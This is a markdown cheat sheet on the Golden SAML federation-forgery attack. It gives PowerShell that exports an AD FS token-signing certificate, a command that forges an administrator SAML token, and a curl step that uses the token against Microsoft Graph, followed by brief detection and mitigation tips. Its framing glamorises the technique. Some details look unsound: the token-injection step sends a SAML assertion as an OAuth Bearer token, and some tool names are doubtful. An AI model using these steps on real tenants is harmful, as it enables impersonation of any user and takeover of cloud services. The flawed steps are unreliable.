# 🏛️ Golden SAML Attack - Federation Forgery for Cloud Domain Dominance

**Golden SAML** is an advanced attack technique where an attacker forges SAML authentication tokens to impersonate *any user*, including admins, across cloud services (e.g., Azure AD, AWS, G Suite) **without ever needing credentials or MFA**.

> ⚠️ Nation-state level technique. Used in the SolarWinds breach by APT29. Bypasses MFA, passwords, and logs in with full SSO trust. Undetectable unless you monitor signing certs.

---

## 🛠️ What It Does
- Exploits the trust between a SAML Identity Provider (IdP) and Service Provider (SP)
- Forges SAML tokens using a stolen **token-signing certificate**
- Grants attacker access to any federated app (e.g., Office 365, AWS) as any user

---

## 💣 Requirements
- Access to the **AD FS private token-signing certificate** (typically from on-prem AD FS)
- Knowledge of user UPNs and app settings
- Tooling (e.g., `Shimit`, `Aorato GoldenSAML`, `ForgeSAML`, `Impacket`)

---

## 🧪 Exploit Chain (Simplified)

### 1. Extract AD FS Token-Signing Certificate
On compromised AD FS server:
```powershell
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object { $_.Subject -like '*youradfs.domain*' }
Export-PfxCertificate -Cert $cert -FilePath adfs.pfx -Password (ConvertTo-SecureString -String 'pass' -Force -AsPlainText)
```
✅ This cert can now be used to sign forged SAML tokens

---

### 2. Forge SAML Assertion
Use `GoldenSAML.py` or `ForgeSAML.exe`:
```bash
GoldenSAML.py -cert adfs.pfx -domain domain.com -user administrator@domain.com -app urn:sharepoint:portal
```
✅ Produces a fully signed SAML token asserting identity of domain admin

---

### 3. Inject Token into Browser (or API)
```bash
curl -H "Authorization: Bearer <saml_token>" https://graph.microsoft.com/v1.0/me
```
✅ Instant admin access to O365, SharePoint, Graph API, etc.

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Logons without preceding Kerberos or password auth | Look for token-based sign-ins with no matching LDAP/AD logon |
| Multiple users logging in from same unusual source | May indicate forged token reuse |
| Unsanctioned certificate usage | Audit federation certs, compare thumbprints against expected

---

## 🔐 Mitigation Strategies
- Rotate and tightly secure AD FS token-signing certificates
- Use Azure AD instead of on-prem ADFS where possible (no cert exposure)
- Monitor for issuance and use of new certs
- Audit SAML token use for anomalies

---

> 🧠 Golden SAML is the **cloud equivalent of a golden ticket**. With one cert, an attacker becomes **everyone** — and no MFA or password can stop them. It’s quiet, powerful, and it’s what the best use to stay invisible.

Only defenders who know about it can even begin to stop it.
